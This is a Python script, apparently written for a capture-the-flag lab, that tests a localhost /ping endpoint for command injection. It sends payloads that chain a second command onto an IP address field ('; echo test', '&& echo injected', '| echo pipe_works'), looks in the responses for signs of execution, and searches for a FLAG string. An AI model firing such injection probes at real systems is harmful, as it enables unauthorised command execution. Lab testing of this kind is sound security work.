import requests
import re
import time

base_url = "http://localhost"
endpoint = "/ping"

print("Testing /ping endpoint for command injection")
print("="*60)

# Simple baseline test
print("\n[1] Baseline test (valid IP)")
try:
    response = requests.post(
        f"{base_url}{endpoint}",
        data={"ip_address": "127.0.0.1"},
        timeout=5,
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    print(f"Status: {response.status_code}")
    print(f"Response: {repr(response.text)}")
    baseline_len = len(response.text)
    print(f"Length: {baseline_len} bytes")
except Exception as e:
    print(f"Error: {e}")
    baseline_len = 0

# Test various injection techniques with delay
test_payloads = [
    ("Semicolon", "127.0.0.1; echo test"),
    ("Double ampersand", "127.0.0.1 && echo injected"),
    ("Pipe", "127.0.0.1 | echo pipe_works"),
]

results = []

for test_name, payload in test_payloads:
    print(f"\n[{len(results)+2}] {test_name}")
    print(f"Payload: {payload}")
    
    try:
        response = requests.post(
            f"{base_url}{endpoint}",
            data={"ip_address": payload},
            timeout=5,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        print(f"Status: {response.status_code}")
        print(f"Response: {repr(response.text)}")
        print(f"Length: {len(response.text)} bytes")
        
        # Check if response differs from baseline
        if len(response.text) != baseline_len:
            print("[!] ANOMALY DETECTED - Response length differed from baseline!")
        
        # Check for command output indicators
        response_text = response.text.lower()
        if any(indicator in response_text for indicator in 
               ['test', 'injected', 'pipe_works', 'root', 'uid=', 'user']):
            print("[!] COMMAND EXECUTION CONFIRMED!")
        
        # Search for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group()}")
        
        results.append({
            'test': test_name,
            'status': response.status_code,
            'response': response.text,
            'length': len(response.text)
        })
        
    except requests.exceptions.ConnectionError as e:
        print(f"[!] CONNECTION ERROR - Server likely crashed! {str(e)[:100]}")
        results.append({
            'test': test_name,
            'error': 'connection_error',
            'payload': payload
        })
    except requests.exceptions.Timeout:
        print(f"[!] TIMEOUT - Request hung!")
        results.append({
            'test': test_name,
            'error': 'timeout',
            'payload': payload
        })
    except Exception as e:
        print(f"[!] ERROR: {str(e)[:100]}")
        results.append({
            'test': test_name,
            'error': 'other',
            'details': str(e)[:100]
        })
    
    # Brief delay between tests
    time.sleep(0.5)

print("\n" + "="*60)
print("RESULTS SUMMARY")
print("="*60)

for result in results:
    if 'error' in result:
        print(f"[!] {result['test']}: ERROR - {result.get('error', 'unknown')}")
    else:
        status = "VULNERABLE" if 'command' in result.get('response', '').lower() or result['length'] > baseline_len else "SAFE"
        print(f"[*] {result['test']}: {status}")

print(f"\nTested {len(test_payloads)} injection vectors")
